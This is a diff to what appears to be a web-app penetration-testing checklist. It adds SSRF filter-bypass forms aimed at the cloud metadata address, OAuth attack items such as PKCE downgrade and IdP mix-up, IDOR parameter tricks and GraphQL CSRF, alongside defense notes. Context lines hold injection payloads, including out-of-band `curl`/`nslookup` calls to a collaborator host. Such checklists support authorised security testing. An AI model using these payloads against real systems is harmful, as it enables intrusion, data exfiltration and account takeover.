@@ -29,7 +29,7 @@
 - [ ] Error-based if errors are visible in the response
 
 **WAF / filter bypass**
-- [ ] JSON syntax (bypasses most WAFs): operator `'@<` / escaping via JSON
+- [ ] JSON syntax (bypasses most WAFs): operators `'@>`/`<@`/`?` (PostgreSQL JSON operators) / escaping via JSON
 - [ ] Inline comments: `SEL/**/ECT`, `UN/**/ION`
 - [ ] Case change: `SeLeCt`
 - [ ] Unicode / double-encoding
@@ -92,6 +92,7 @@
 **Filter bypass**
 - [ ] Decimal/hex IP: `http://2130706433/`, `http://0x7f000001/`, `http://0177.0.0.1`
 - [ ] Userinfo trick: `http://localhost@attacker.com`, `http://attacker.com#localhost`
+- [ ] IPv6 / short forms: `http://[::1]/`, `http://[::ffff:169.254.169.254]/`, `http://0/`, `http://0.0.0.0/`; follow a 30x redirect from an allowed host to `169.254.169.254`
 - [ ] Alternative schemes: `gopher://` (Redis/SMTP), `dict://`, `file://`
 - [ ] DNS rebinding (TOCTOU) - if validation and the request are separated (Singularity)
 - [ ] If IMDSv2 is enabled -> look for a service that renders HTML/XML (iframe `<iframe src="http://169.254.169.254/...">` in pandoc-like converters)
@@ -144,6 +145,7 @@
 - [ ] Decode "indirect" IDs: base64 (`MTIzNDU2`->`123456`), hash -> look for sequential ints
 - [ ] Function-level: as a regular user, hit `/admin/...`, `/api/internal/...`
 - [ ] Chain: IDOR + Mass Assignment -> set `password`/`email` on someone else's object -> ATO
+- [ ] Array/object wrap & HPP: `id[]=victim`, `{"id":[victim]}`, duplicate `id=self&id=victim` - the backend authorizes one value and acts on another
 
 **Tools:** Burp **Autorize** (replay with low-priv cookie), Repeater, Logger, `ffuf` (shadow endpoints, Swagger)
 **Defense (for the report):** server-side object ownership check; indirect object references; user-context validation
@@ -182,7 +184,7 @@
 
 **Detection**
 - [ ] In-band: `;id`, `|id`, `` `id` ``, `$(id)`, `&&id`, `||id`
-- [ ] Blind time: `;sleep 10`, `& timeout 10`
+- [ ] Blind time: `;sleep 10`, `& ping -n 11 127.0.0.1`
 - [ ] Blind OOB: `;nslookup $(whoami).<collab>`, `;curl http://<collab>/`
 
 **Exploitation**
@@ -256,7 +258,7 @@
 ## 10. Insecure Deserialization
 
 **Recon / where to look**
-- [ ] Find serialized data by signatures: Java `rO0`/`0xACED`, .NET `AAEAAAD`/`0xFFFE`, PHP `O:`/`a:`
+- [ ] Find serialized data by signatures: Java `rO0`/`0xACED`, .NET `AAEAAAD` / hex `00 01 00 00 00 FF FF FF FF`, PHP `O:`/`a:`
 - [ ] Check cookies, `viewstate`, tokens, cache, queues
 
 **Detection**
@@ -311,9 +313,14 @@
 - [ ] Identity injection: login by mutable `email` (rather than immutable `sub`/Object ID)
 - [ ] Authorization-code swap: a stolen code from any application -> first-party token (if client/redirect/nonce is not checked)
 - [ ] Reflected XSS in `error_description`/`redirectUrl` on the trusted callback
+- [ ] PKCE downgrade/removal: drop `code_challenge` or switch `S256`->`plain` (or supply your own verifier) -> an intercepted code is exchangeable again
+- [ ] Authorization-code reuse: the server doesn't invalidate the code after the first exchange -> replay a stolen code for a second token
+- [ ] code/token leak via Referer: a callback carrying `code`/`token` in the URL leaks to third-party resources (img/script/link) through the Referer header
+- [ ] Scope escalation: tamper/expand `scope` in the authorization request or at exchange -> a token with more rights than the client should have
+- [ ] IdP mix-up: in multi-IdP setups start the flow with the attacker IdP, feed the honest IdP's callback -> the `code` goes to the wrong token endpoint (if there is no `iss`/IdP binding)
 
 **Tools:** Burp, Doyensec OAuth Security Cheat Sheet
-**Defense (for the report):** strict `redirect_uri` validation; PKCE; email verification; bind the code to client/redirect/nonce
+**Defense (for the report):** strict `redirect_uri` validation; PKCE (S256, mandatory); email verification; bind the code to client/redirect/nonce; single-use code; check `iss`
 
 ---
 
@@ -324,9 +331,9 @@
 - [ ] Password reset: token leaks into Referer / into the response / is predictable
 - [ ] Password reset: `Host`-header poisoning -> the link with the reset token goes to your domain
 - [ ] Email change without re-auth (+ chain with IDOR/Mass Assignment on someone else's profile)
-- [ ] OAuth pre-account takeover (see §12)
-- [ ] JWT forge (see §11)
-- [ ] 2FA bypass: response manipulation (`{"success":false}`->`true`), step skip, OTP brute (+ race, see §15)
+- [ ] OAuth pre-account takeover
+- [ ] JWT forge
+- [ ] 2FA bypass: response manipulation (`{"success":false}`->`true`), step skip, OTP brute (+ race)
 - [ ] Session is not invalidated after a password change
 - [ ] Username/email collision: leading/trailing spaces (`"admin "`), Unicode normalization (NFKC) and IDN homoglyphs (Cyrillic `а`, `demⓞ@x.com`) collapse your account into the victim's on reset/merge
 
@@ -348,7 +355,7 @@
 - [ ] Price/currency/discount manipulation in the request
 - [ ] Coupons/referrals: reapply, abuse
 - [ ] Cart/order state: swap after the price is calculated
-- [ ] Replay of a single operation (+ race, see §15)
+- [ ] Replay of a single operation (+ race)
 
 **Tools:** manual analysis + Burp Repeater; Turbo Intruder for edge cases
 **Defense (for the report):** server-side validation of invariants and state transitions; idempotency
@@ -404,7 +411,7 @@
 - [ ] Whitelisted domain in the path/fragment
 
 **Chain (the main value)**
-- [ ] Client-side open redirect -> bypass `SameSite=Strict` CSRF (see §6)
+- [ ] Client-side open redirect -> bypass `SameSite=Strict` CSRF
 - [ ] Theft of the OAuth `code`/token via `redirect_uri`
 - [ ] SSRF amplification: redirect from an allowed host to `169.254.169.254`
 
@@ -452,6 +459,7 @@
 - [ ] BOLA/IDOR in mutations (field-level authz is often incomplete)
 - [ ] DoS: deep recursion of cyclic types; N alias copies of an expensive resolver; `first:99999999`
 - [ ] Field suggestions enabled -> schema enumeration even without introspection
+- [ ] GraphQL CSRF: mutation via `Content-Type: text/plain` / `x-www-form-urlencoded` or query-over-GET (skips the JSON preflight, no CSRF token)
 
 **Tools:** **InQL**, `GraphQLmap`, GraphQL Voyager, GraphQL Raider
 **Defense (for the report):** disable introspection in prod (unauth); query depth/complexity limit; rate-limit by number of operations; persisted queries; per-resolver authz
